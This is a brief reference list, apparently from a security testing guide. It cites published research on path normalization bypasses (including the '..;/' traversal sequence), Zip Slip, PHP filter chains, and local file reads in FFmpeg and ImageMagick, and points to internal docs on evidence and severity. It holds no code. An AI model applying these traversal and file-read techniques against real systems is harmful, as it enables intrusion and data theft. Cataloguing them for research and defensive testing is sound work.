- Orange Tsai, "Breaking Parser Logic! Take Your Path Normalization Off and Pop 0days Out" (Black Hat USA 2018):
  nginx off-by-slash and `..;/` behind reverse proxies.
- Snyk, "Zip Slip" (2018).
- Synacktiv, `php_filter_chain_generator` and the PHP filter chain write-ups (2022).
- neex, `ffmpeg-avi-m3u-xbin` (FFmpeg HLS local file read); Metabase Q, CVE-2022-44268 (ImageMagick, 2023).
- `docs/04-evidence-standard.md` (proof files and where to stop) and `docs/06-severity.md` (the read vector).
